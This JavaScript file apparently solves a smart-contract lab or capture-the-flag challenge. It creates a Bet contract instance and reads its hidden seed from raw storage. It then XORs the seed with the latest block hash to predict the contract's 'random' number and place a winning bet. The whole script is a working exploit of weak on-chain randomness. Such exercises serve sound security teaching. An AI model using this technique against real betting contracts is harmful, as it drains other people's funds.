const fs = require('fs')
const lib = require('../lab03/lib')(require('../lab03/config'))
web3 = lib.web3

async function main() {
    let factory_addr = '0x8e0a809B1f413deB6427535cC53383954DBF8329'
    let factory = lib.contract(factory_addr, JSON.parse(fs.readFileSync('BetFactory.abi')))

    let instance_address = await factory.view('instances', lib.account.address)

    // if (instance_address === '0x0000000000000000000000000000000000000000') {
    await factory.call({value: web3.utils.toWei('0.6', 'ether')}, 'create')
    instance_address = await factory.view('instances', lib.account.address)
    // }
    console.log(`instance = ${instance_address}`)

    let seed = await web3.eth.getStorageAt(instance_address, 1)
    let bn = await web3.eth.getBlockNumber()
    let b2 = (await web3.eth.getBlock(bn))['hash']
    rand = web3.utils.toBN(seed).xor(web3.utils.toBN(b2))
    console.log(rand)
    instance = lib.contract(instance_address, JSON.parse(fs.readFileSync('Bet.abi')))
    await instance.call({value: web3.utils.toWei('0.00000001', 'ether')}, 'bet', rand)
}

main()